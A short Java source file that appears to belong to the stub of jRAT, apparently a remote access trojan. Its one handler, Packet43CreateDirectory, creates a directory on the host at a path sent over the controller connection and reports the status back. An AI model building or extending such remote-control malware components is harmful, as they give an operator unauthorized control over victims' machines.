package se.jrat.stub.packets.incoming;

import java.io.File;

import se.jrat.stub.Connection;
import se.jrat.stub.Constants;


public class Packet43CreateDirectory extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String where = Connection.readLine();
		String name = Connection.readLine();

		File file = new File(where + File.separator + name);
		file.mkdirs();
		Connection.status(Constants.STATUS_MKDIR);
	}

}
